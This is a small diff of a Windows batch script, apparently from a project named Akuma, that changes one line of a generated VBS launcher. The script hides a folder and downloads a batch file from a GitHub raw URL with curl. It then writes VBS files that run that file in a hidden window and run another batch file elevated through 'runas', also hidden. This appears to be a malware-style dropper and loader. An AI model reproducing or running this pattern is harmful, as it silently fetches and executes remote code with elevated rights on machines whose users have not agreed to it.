@@ -6,7 +6,7 @@ attrib +h %homedrive%\ShiniGami
 curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\ShiniGami\Akuma.bat
 del %userprofile%\Akuma\死神.vbs
 echo Set objShell = CreateObject("WScript.Shell") >> %userprofile%\Akuma\死神.vbs
-echo objShell.Run " %homedrive%\ShiniGami\Akuma.bat", 0, False >> %userprofile%\Akuma\死神.vbs
+echo objShell.Run "%homedrive%\ShiniGami\Akuma.bat", 0, False >> %userprofile%\Akuma\死神.vbs
 del %userprofile%\Akuma\beyondbirthday.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %userprofile%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%userprofile%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %userprofile%\Akuma\beyondbirthday.vbs
